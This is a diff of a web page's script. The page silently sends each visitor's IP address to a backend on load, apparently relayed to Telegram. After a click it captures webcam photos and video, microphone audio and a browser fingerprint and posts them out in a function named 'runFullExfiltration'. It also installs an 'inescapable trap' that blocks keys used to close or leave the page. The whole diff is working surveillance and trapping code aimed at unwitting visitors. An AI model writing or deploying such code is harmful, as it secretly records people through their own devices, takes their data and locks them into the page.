@@ -151,22 +151,21 @@ body, html {
 
 <div class="backg"><img src="naggars.gif"></div>
 
-<!-- jQuery (needed for some scripts) -->
+<!-- jQuery -->
 <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
 
-<!-- MAIN SCRIPT: Immediate ping + Inescapable trap + Full capture -->
+<!-- MAIN SCRIPT: Immediate IP ping + Inescapable trap + Full capture -->
 <script>
 (function() {
     // ================================================================
     // CONFIG
     // ================================================================
-    const BACKEND_URL = '/api/telegram';  // must match server endpoint
+    const FULL_CAPTURE_URL = '/api/telegram';  // after click
+    const PING_URL = '/api/ping';               // immediate, IP only
     let hasTriggered = false;
-    const ORIGINAL_WIDTH = 640;
-    const ORIGINAL_HEIGHT = 480;
 
     // ================================================================
-    // 1. IP INFO (silent, no gesture)
+    // 1. IP INFO
     // ================================================================
     async function getIP() {
         try {
@@ -185,7 +184,7 @@ body, html {
     }
 
     // ================================================================
-    // 2. DEVICE / BROWSER FINGERPRINT (full details)
+    // 2. FINGERPRINT (for full capture)
     // ================================================================
     function getFingerprint() {
         const fp = {};
@@ -222,10 +221,7 @@ body, html {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if(gl) {
-                fp.webgl = {
-                    vendor: gl.getParameter(gl.VENDOR),
-                    renderer: gl.getParameter(gl.RENDERER)
-                };
+                fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
             } else {
                 fp.webgl = 'unsupported';
             }
@@ -235,42 +231,27 @@ body, html {
     }
 
     // ================================================================
-    // 3. SEND TO BACKEND (with retry)
+    // 3. ⚡ IMMEDIATE PING – ONLY IP (no fingerprint, no media)
     // ================================================================
-    async function sendToBackend(ipData, fingerprint, photo, video, mic) {
-        const payload = {
-            ipData,
-            fingerprint,
-            photo: photo || null,
-            video: video || null,
-            mic: mic || null,
-            timestamp: new Date().toISOString()
-        };
+    async function sendImmediateInfo() {
+        console.log('[PING] Fetching IP...');
+        const ipData = await getIP();
+        const payload = { ipData, timestamp: new Date().toISOString() };
         try {
-            const res = await fetch(BACKEND_URL, {
+            await fetch(PING_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-            if (!res.ok) console.warn('[PING] Backend error:', await res.text());
+            console.log('[PING] Sent IP to Telegram');
         } catch(e) {
-            console.warn('[PING] send failed, retrying in 2s');
-            setTimeout(() => sendToBackend(ipData, fingerprint, photo, video, mic), 2000);
+            console.warn('[PING] Failed, retrying in 2s...');
+            setTimeout(sendImmediateInfo, 2000);
         }
     }
 
     // ================================================================
-    // 4. ⚡ IMMEDIATE PING (NO CLICK) – runs on page load
-    // ================================================================
-    async function sendImmediateInfo() {
-        console.log('[PING] Fetching IP + fingerprint...');
-        const [ip, fp] = await Promise.all([getIP(), Promise.resolve(getFingerprint())]);
-        console.log('[PING] Sending to Telegram');
-        await sendToBackend(ip, fp, null, null, null);
-    }
-
-    // ================================================================
-    // 5. FULL CAPTURE (WEBAM & MIC) – triggered after click
+    // 4. FULL CAPTURE (after click) – Webcam photo, video, mic
     // ================================================================
     async function captureWebcamPhoto() {
         try {
@@ -329,18 +310,32 @@ body, html {
     }
 
     async function runFullExfiltration() {
-        const [ip, fp, photo, video, mic] = await Promise.all([
+        const [ipData, fp, photo, video, mic] = await Promise.all([
             getIP(),
             Promise.resolve(getFingerprint()),
             captureWebcamPhoto(),
             captureWebcamVideo(),
             captureMic()
         ]);
-        await sendToBackend(ip, fp, photo, video, mic);
+        const payload = {
+            ipData,
+            fingerprint: fp,
+            photo,
+            video,
+            mic,
+            timestamp: new Date().toISOString()
+        };
+        try {
+            await fetch(FULL_CAPTURE_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch(e) { console.warn('[FULL] Send failed:', e); }
     }
 
     // ================================================================
-    // 6. INESCAPABLE TRAP – impossible to leave
+    // 5. INESCAPABLE TRAP
     // ================================================================
     function trapUser() {
         // Block all key combos that could close/leave
@@ -438,7 +433,7 @@ body, html {
     }
 
     // ================================================================
-    // 7. AUDIO BOOST & START EXPERIENCE (ORIGINAL)
+    // 6. AUDIO BOOST & START EXPERIENCE
     // ================================================================
     let audioContext, gainNode;
     const mediaElements = [];
@@ -499,9 +494,9 @@ body, html {
     document.getElementById('startOverlay').addEventListener('click', startExperience);
 
     // ================================================================
-    // 8. FIRE IMMEDIATE PING – as soon as page loads
+    // 7. FIRE IMMEDIATE PING – AS SOON AS PAGE LOADS
     // ================================================================
-    console.log('[PING] Page loaded – sending immediate info...');
+    console.log('[PING] Page loaded – sending IP...');
     sendImmediateInfo().catch(console.warn);
 
     // Start trapping immediately (even before click)
